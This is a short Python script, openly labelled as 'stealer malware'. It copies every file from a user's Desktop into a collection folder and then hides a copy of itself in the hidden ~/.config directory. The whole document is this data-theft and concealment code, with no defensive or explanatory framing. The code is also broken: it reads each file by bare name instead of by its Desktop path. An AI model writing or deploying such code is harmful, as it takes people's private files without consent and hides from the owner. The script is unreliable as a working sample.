import os
from shutil import copyfile

def steal_info():
    # Steal files from user's desktop
    files = [f for f in os.listdir("/home/user/Desktop") if os.path.isfile(os.path.join("/home/user/Desktop", f))]
    
    for file in files:
        with open(f"/home/user/stealer/{file}", "w") as output, open(file, "r") as input:
            output.write(input.read())

def hide_stealer():
    # Hide the stealer malware by copying it to a hidden folder
    copyfile("/home/user/stealer.py", "/home/user/.config/stealer.py")

def main():
    steal_info()
    hide_stealer()

if __name__ == "__main__":
    main()
